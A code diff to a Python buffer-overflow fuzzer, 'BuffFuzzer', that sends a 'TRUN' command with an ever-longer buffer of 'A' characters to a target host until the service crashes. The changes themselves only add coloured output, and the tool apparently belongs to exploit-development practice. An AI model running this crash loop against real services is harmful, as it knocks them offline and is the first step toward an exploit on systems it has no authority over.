@@ -3,7 +3,7 @@ import sys
 import time
 import socket
 import argparse
-
+from color_print import print_success, print_error, print_info
 
 def main():
     parser = argparse.ArgumentParser(description="BuffFuzzer v1.0")
@@ -19,7 +19,7 @@ def main():
 
     while True:
         try:
-            print(f"Sending payload with {len(buffer)} bytes")
+            print(f"[-]Sending payload with {len(buffer)} bytes")
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target_ip, target_port))
             s.send(("TRUN /.:/" + buffer).encode())
@@ -35,13 +35,13 @@ def main():
             buffer += "A" * 100
 
         except socket.timeout:
-            print(f"Target response timed out. Crashed at {len(buffer)} bytes.")
+            print_success(f"Target response timed out. Crashed at {len(buffer)} bytes.")
             if output_file:
                 with open(output_file, "a") as f:
                     f.write(f"Target crashed at {len(buffer)} bytes\n")
             sys.exit()
         except Exception as e:
-            print(f"An error occurred: {e}")
+            print_error(f"An error occurred: {e}")
             sys.exit()
 
 if __name__ == "__main__":
